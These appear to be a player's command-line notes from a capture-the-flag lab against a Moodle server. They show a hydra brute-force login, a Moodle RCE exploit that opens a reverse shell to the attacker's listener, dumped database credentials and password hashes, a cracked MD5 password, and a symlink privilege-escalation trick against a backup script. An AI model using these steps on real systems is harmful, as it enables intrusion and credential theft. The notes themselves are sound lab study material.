@@ -1,0 +1,62 @@
+curl http://10.10.10.153/gallery.html|grep "href" -
+<li><a href="#"><img src="images/5.png" onerror="console.log('That\'s an F');" alt=""></a></li>
+
+wget http://10.10.10.153/images/5.png
+
+cat 5.png
+Hi Servicedesk,
+
+I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.
+
+Could you guys figure out what the last charachter is, or just reset it?
+
+Thanks,
+Giovanni
+
+# time to bruteforce login
+python create_password_list.py > password_brute.txt
+hydra -l Giovanni -P password_brute.txt 10.10.10.153 http-post-form "/moodle/login/index.php:anchor=&username=^USER^&passwo
+rd=^PASS^:Invalid login"
+[80][http-post-form] host: 10.10.10.153   login: Giovanni   password: Th4C00lTheacha#
+
+# RCE
+searchsploit -m exploits/php/webapps/46551.php
+php 46551.php url=http://10.10.10.153/moodle/ user=Giovanni pass=Th4C00lTheacha# ip=10.10.15.45 port=53 course=2
+
+# nc -lvnp 53
+listening on [any] 53 ...
+connect to [10.10.15.45] from (UNKNOWN) [10.10.10.153] 54754
+/bin/sh: 0: can't access tty; job control turned off
+$
+
+password = /var/www/html/moodle/config.php
+mysql -u root -p moodle
+Password: Welkom1!
+
+> SELECT username, password FROM mdl_user;
++-------------+--------------------------------------------------------------+
+| username    | password                                                     |
++-------------+--------------------------------------------------------------+
+| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
+| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
+| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
+| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
++-------------+--------------------------------------------------------------+
+
+md5sum expelled 7a860966115182402ed06375cf0a22af
+su - giovanni
+password: expelled
+
+cat /usr/bin/backup.sh
+#!/bin/bash
+cd /home/giovanni/work;
+tar -czvf tmp/backup_courses.tar.gz courses/*;
+cd tmp;
+tar -xf backup_courses.tar.gz;
+chmod 777 * -R;
+
+cd work
+rm -rf tmp
+ln -s / tmp
+
+
